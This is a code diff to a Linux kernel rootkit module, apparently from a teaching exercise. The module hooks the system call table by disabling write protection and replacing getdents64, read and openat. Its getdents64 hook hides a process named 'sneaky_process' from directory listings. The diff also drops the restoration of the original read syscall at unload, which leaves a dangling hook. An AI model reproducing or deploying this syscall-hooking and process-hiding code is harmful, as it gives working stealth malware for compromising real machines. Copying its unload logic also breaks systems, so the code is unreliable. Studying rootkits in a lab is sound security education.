@@ -22,9 +22,6 @@ static unsigned long *sys_call_table;
 //   char d_name[]; /* Filename (null-terminated) */
 // };
 
-static char *pid = "";
-module_param(pid, charp, 0);
-MODULE_PARM_DESC(pid, "The process id of sneaky program");
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -58,7 +55,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   ssize_t bpos;
   nread = original_getdents64(regs);
   for(bpos=0;bpos<nread;){
-    d = (struct linux_dirent64 *)((char *)dirptr + bpos);
+    d = (struct linux_dirent64 *)((char *)regs->si + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0){
       int current_size = d->d_reclen;
       int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
@@ -91,8 +88,7 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
   return nread;
 }
 
-
-asmlinkage int (*original_openat)(struct pt_regs *regs);
+asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
@@ -146,7 +142,6 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)original_read;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 }  
